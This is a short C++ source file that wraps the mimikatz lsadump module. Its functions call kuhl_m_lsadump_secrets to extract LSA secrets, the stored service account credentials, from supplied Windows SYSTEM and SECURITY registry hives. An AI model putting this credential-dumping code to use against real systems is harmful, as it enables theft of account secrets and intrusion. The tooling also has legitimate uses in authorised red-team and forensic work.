#include <stdio.h>
#include <string>

#include "mimikatz\kuhl_m_lsadump.h"

#ifdef MIMIKATZLIB
	#include "lsadumpsecrets.h"
#endif

#pragma comment(lib, "ntdll.min.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "cryptdll.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "shlwapi.lib")

#ifdef MIMIKATZLIB
int testmain(int argc, char** argv)
#else
int main(int argc, char** argv)
#endif
{
	kuhl_m_lsadump_secrets(nullptr, 0, "", "");
	return 0;
}

void dump_svc_secrets(PSVC_STRUCT *svc_arr, size_t svc_arr_size, std::string sysHive, std::string securityHive)
{
	kuhl_m_lsadump_secrets( svc_arr, svc_arr_size, sysHive.c_str(), securityHive.c_str());
}